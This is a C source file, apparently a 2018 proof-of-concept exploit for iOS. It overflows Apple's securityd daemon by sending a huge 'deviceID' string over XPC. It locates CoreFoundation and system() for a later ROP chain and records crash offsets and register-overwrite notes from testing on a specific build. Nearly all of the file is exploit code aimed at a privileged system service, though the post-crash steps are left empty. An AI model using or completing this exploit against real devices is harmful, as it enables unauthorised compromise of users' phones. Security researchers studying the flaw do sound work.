//
//  racer#2
//
//  Created by Abraham Masri on 2/11/18.
//  Copyright Â© 2018 Abraham Masri @cheesecakeufo. All rights reserved.
//

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach-o/dyld.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld_images.h>

/*
 *  purpose: finds the address of a dylib
 *  reference: https://blog.lse.epita.fr/articles/82-playing-with-mach-os-and-dyld.html
 */
uint64_t get_dylib_address(char* dylib_name){

    struct task_dyld_info dyld_info;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    
    kern_return_t ret = task_info(mach_task_self_, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
    if (ret != KERN_SUCCESS) {
        printf("[ERROR]: failed to get task_info\n");
        return 0; // fail
    }
    
    mach_vm_address_t image_infos = dyld_info.all_image_info_addr;
    struct dyld_all_image_infos *infos;
    infos = (struct dyld_all_image_infos *)image_infos;
    struct dyld_image_info *image_array = (void *)infos->infoArray;
    
    // Find the among them
    struct dyld_image_info *image;
    for (int i = 0; i < infos->infoArrayCount; ++i) {
        image = image_array + i;
        
        //printf("[INFO]: %s: 0x%llx\n", image->imageFilePath, (mach_vm_address_t)image->imageLoadAddress);
        
        if(strcmp(dylib_name, image->imageFilePath) == 0) {
            return (mach_vm_address_t)image->imageLoadAddress;
        }
        
    }

    return 0; // fail
}



/*
 *  purpose: overflows securityd
 *  note: this is just a PoC. Exploiting this requires a certain technique. While it is possible, I will keep this as a PoC.
 */
void overflow_securityd () {
    
    printf("[*] initiating securityd exploit\n");
    
    // get CoreFoundation's address for ROP later
    
    extern uint64_t get_dylib_address(char *);
    
    uint64_t corefoundation_address = get_dylib_address("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation");
    
    if(corefoundation_address <= 0) {
        printf("[ERROR]: could not get CoreFoundation's address.\n");
        return;
    }
    
    printf("[INFO]: found CoreFoundation at: 0x%llx\n", corefoundation_address);

    // get shared 'system' address
    uint64_t system_address = (uint64_t)dlsym(RTLD_DEFAULT, "system");
    
    printf("[INFO]: system: 0x%llx\n", system_address);
    
    //const char* command = "/bin/ps";
    
    // initiate connection with securityd
    xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.securityd", NULL, 0);
    xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {});
    
    xpc_connection_resume(conn);
    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);

    xpc_dictionary_set_uint64(msg, "operation" /* kSecXPCKeyOperation */, 0x27);
    
    // 0x27:
    char overflow[600000] = {0}; // 600000: crashes at x2, 650000: crashes at x3
    size_t overflow_size = sizeof(overflow);
    printf("[INFO]: overflow_size: 0x%zx (%d)\n", overflow_size, (uint32_t)overflow_size);

    
    // personal notes below (i7 11.3 15E5189f):
    // - size doesn't really matter as long as
    // size of 600000 and set null terminator at 570000 and later will cause a binary images overwrite
    // size of 550000 and set null terminator at 550000 and later will cause to fail at a different location (ca20) WITH registers overwrite
    // size of 540000 <-> 549000 and set null terminator at 550000 and later will cause to fail at a different location (11c8) WITHOUT registers overwrite
    
    
    // start:
    memset(&overflow, '\x55', overflow_size);
    
    // middle:
    //overflow[2000] = '\x00';
    //memset(&overflow[2000], '\x00\x00\x20\xd4', overflow_size - 2000);
    
    // end:
    // memset(&overflow[5000], '\x41', overflow_size - 5000);
    
    // 549630 <--> 549620
    // 549600: pc: 1d0 or 1c8 (crash log: 220737)
    // 549626 <-> 549627: pc: 0x00000001020791d4 (crash log: 221912)
    // 549628: pc: 0x00000001003b91c8 (crash log: 2223229)
    // 549629: pc: ca20. registers overwritten. x18/x14 are partially overwritten.
    // int x = 549628;
    // memset(&overflow[x], '\0', overflow_size - x);
    
    // overflow[549597] = '\0';
    
#if 0
    memset(&overflow[530000], '\x00', 8);

    // x8:
    memset(&overflow[1000], '\x41', overflow_size - 1000);

    // x9:
    memset(&overflow[249843], '\x09', 8);

    // x10:
    memset(&overflow[249851], '\x10', 8);

    // x11:
    memset(&overflow[249859], '\x11', 8);

    // x14 (can overwrite parially):
    memset(&overflow[0], '\x14', 4);

    // x15:
    memset(&overflow[4], '\x15', 8);
#endif
    
    overflow[overflow_size] = '\x00';
    //NSLog(@"%s", &overflow[249835]);
    //printf("%s\n", overflow);
    //exit(0);
    
    xpc_dictionary_set_string(msg, "deviceID", overflow);

    printf("[INFO]: sending payload to securityd\n");
    
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
    
    if(reply == XPC_ERROR_CONNECTION_INTERRUPTED) {
        printf("[INFO]: successfully sent our payload to securityd\n");
        
        bzero(overflow, overflow_size);

        // next steps:
        



        
    } else {
        printf("[ERROR]: failed to overflow securityd: %s\n", xpc_copy_description(reply));
    }
    
    
    //NSLog(@"[INFO]: reply: %s", xpc_copy_description(reply));
    
}
